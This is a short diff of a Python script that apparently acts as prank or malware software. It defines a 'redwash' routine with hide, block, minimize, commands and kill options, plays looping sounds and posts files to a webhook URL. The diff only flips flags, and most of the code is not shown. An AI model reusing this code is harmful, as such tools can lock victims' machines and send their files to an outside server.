@@ -213,10 +213,10 @@ $$$"                         $$$$"'''.split('\n')
     # e.g: resource_path('example.mp3', False) --> resource_path('example.mp3', True)
 
     # Play "buzz.mp3" in an infinite loop
-    createDaemonThread(play_sound(resource_path('buzz.mp3', True), True))
+    createDaemonThread(play_sound(resource_path('buzz.mp3', False), True))
 
     # Play "appear.mp3" once
-    createDaemonThread(play_sound(resource_path('appear.mp3', True), False))
+    createDaemonThread(play_sound(resource_path('appear.mp3', False), False))
 
 def redwash(hide=True, block=True, minimize=True, commands=True, kill=True, oF=sleep(0)):
     # Minimize program window
@@ -275,5 +275,6 @@ def otherCode():
     res = post(webhook_url, files=files, data=data)
 
 if __name__ == "__main__":
+
     # hide=True, block=True, minimize=True, commands=True, kill=True, oF=sleep(0)
-    redwash(True, True, True, True, True, False, otherCode)
+    redwash(True, False, True, True, False, otherCode)
